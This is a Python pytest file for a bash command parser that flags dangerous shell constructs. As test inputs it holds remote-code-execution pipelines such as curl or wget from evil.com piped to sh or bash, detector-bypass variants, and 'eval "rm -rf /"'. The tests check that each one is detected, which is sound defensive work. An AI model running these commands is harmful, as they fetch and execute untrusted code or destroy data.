"""Tests for BashCommandParser."""

import pytest

from schlock.exceptions import ParseError


class TestBashCommandParser:
    """Test suite for BashCommandParser."""

    def test_parse_simple_command(self, parser):
        """Parse simple commands successfully."""
        ast = parser.parse("echo hello")
        assert ast is not None

    @pytest.mark.parametrize(
        "command,expected_commands",
        [
            ("git log | grep pattern", ["git", "grep"]),
            ("ls -la | head -n 10 | tail -n 5", ["ls", "head", "tail"]),
        ],
    )
    def test_parse_pipes(self, parser, command, expected_commands):
        """Parse piped commands."""
        ast = parser.parse(command)
        commands = parser.extract_commands(ast)
        for expected in expected_commands:
            assert expected in commands

    @pytest.mark.parametrize(
        "command,expected_cmd",
        [
            ("echo foo > bar.txt", "echo"),
            ("cat input.txt >> output.txt", "cat"),
        ],
    )
    def test_parse_redirects(self, parser, command, expected_cmd):
        """Parse redirected commands."""
        ast = parser.parse(command)
        commands = parser.extract_commands(ast)
        assert expected_cmd in commands

    def test_parse_subshells(self, parser):
        """Parse subshell command substitution."""
        ast = parser.parse("rm $(whoami)")
        dangers = parser.has_dangerous_constructs(ast)
        assert "command substitution detected" in dangers

    @pytest.mark.parametrize(
        "invalid_command,error_substring",
        [
            ('echo "unclosed string', "Failed to parse"),
            ("((( invalid", "Failed to parse"),
        ],
    )
    def test_parse_invalid_syntax(self, parser, invalid_command, error_substring):
        """Raise ParseError on invalid syntax."""
        with pytest.raises(ParseError) as exc:
            parser.parse(invalid_command)
        assert error_substring in str(exc.value)

    def test_parse_empty_command(self, parser):
        """Raise ValueError on empty command."""
        with pytest.raises(ValueError) as exc:
            parser.parse("")
        assert "cannot be empty" in str(exc.value)

    @pytest.mark.parametrize(
        "command,expected_cmd",
        [
            ("ls -la", "ls"),
            ("git status", "git"),
            ("python script.py", "python"),
        ],
    )
    def test_extract_commands(self, parser, command, expected_cmd):
        """Extract command names correctly."""
        ast = parser.parse(command)
        commands = parser.extract_commands(ast)
        assert expected_cmd in commands

    @pytest.mark.parametrize(
        "command,danger_pattern",
        [
            ('eval "rm -rf /"', "eval command detected"),
            ("exec bash", "exec command detected"),
        ],
    )
    def test_dangerous_constructs(self, parser, command, danger_pattern):
        """Detect dangerous command constructs."""
        ast = parser.parse(command)
        dangers = parser.has_dangerous_constructs(ast)
        assert danger_pattern in dangers

    def test_parse_whitespace_only(self, parser):
        """Raise ValueError on whitespace-only command."""
        with pytest.raises(ValueError) as exc:
            parser.parse("   \t\n  ")
        assert "cannot be whitespace-only" in str(exc.value)

    def test_process_substitution_detection(self, parser):
        """Detect process substitution constructs."""
        ast = parser.parse("diff <(ls dir1) <(ls dir2)")
        dangers = parser.has_dangerous_constructs(ast)
        assert "process substitution detected" in dangers


class TestDangerousPipelineDetection:
    """Test suite for _detect_dangerous_pipelines AST analysis."""

    def test_curl_pipe_to_sh_detected(self, parser):
        """Detect curl piped to shell."""
        ast = parser.parse("curl http://evil.com/script | sh")
        dangers = parser.has_dangerous_constructs(ast)
        assert any("remote code execution" in d for d in dangers)

    def test_wget_pipe_to_bash_detected(self, parser):
        """Detect wget piped to bash."""
        ast = parser.parse("wget -qO- http://evil.com | bash")
        dangers = parser.has_dangerous_constructs(ast)
        assert any("remote code execution" in d for d in dangers)

    def test_curl_pipe_with_env_var_prefix(self, parser):
        """Detect curl|sh even with VAR=value prefix (bypass attempt)."""
        ast = parser.parse("curl http://x.com/s | VAR=value sh")
        dangers = parser.has_dangerous_constructs(ast)
        assert any("remote code execution" in d for d in dangers)

    def test_curl_pipe_with_redirect_suffix(self, parser):
        """Detect curl|sh even with redirects."""
        ast = parser.parse("curl http://x.com/s | sh 2>&1")
        dangers = parser.has_dangerous_constructs(ast)
        assert any("remote code execution" in d for d in dangers)

    def test_safe_pipeline_not_flagged(self, parser):
        """Safe pipelines (no download->shell) should not be flagged."""
        safe_pipelines = [
            "cat file.txt | grep pattern",
            "ls -la | head -10",
            "ps aux | grep python",
            "echo hello | base64",
        ]
        for cmd in safe_pipelines:
            ast = parser.parse(cmd)
            dangers = parser.has_dangerous_constructs(ast)
            assert not any("remote code execution" in d for d in dangers), f"False positive: {cmd}"

    def test_curl_to_safe_command_not_flagged(self, parser):
        """Curl piped to safe command (not shell) should not be flagged."""
        safe_curls = [
            "curl http://api.example.com | jq .",
            "curl http://example.com | grep pattern",
            "wget -qO- http://example.com | head -10",
        ]
        for cmd in safe_curls:
            ast = parser.parse(cmd)
            dangers = parser.has_dangerous_constructs(ast)
            assert not any("remote code execution" in d for d in dangers), f"False positive: {cmd}"

    def test_single_command_no_pipeline(self, parser):
        """Single command (no pipeline) should not trigger pipeline detection."""
        ast = parser.parse("curl http://example.com")
        dangers = parser.has_dangerous_constructs(ast)
        assert not any("remote code execution" in d for d in dangers)

    def test_empty_ast_handled(self, parser):
        """Empty AST list should not cause errors."""
        # Call internal method directly with empty list
        dangers = parser._detect_dangerous_pipelines([])
        assert dangers == []

    def test_none_ast_handled(self, parser):
        """None AST should not cause errors."""
        dangers = parser._detect_dangerous_pipelines(None)
        assert dangers == []

    def test_multi_stage_pipeline(self, parser):
        """Multi-stage pipeline with download in middle."""
        # curl is first, should detect curl->sh
        ast = parser.parse("curl http://x.com/s | cat | sh")
        dangers = parser.has_dangerous_constructs(ast)
        assert any("remote code execution" in d for d in dangers)

    def test_full_path_commands(self, parser):
        """Commands with full paths should be detected."""
        ast = parser.parse("/usr/bin/curl http://x.com/s | /bin/bash")
        dangers = parser.has_dangerous_constructs(ast)
        assert any("remote code execution" in d for d in dangers)
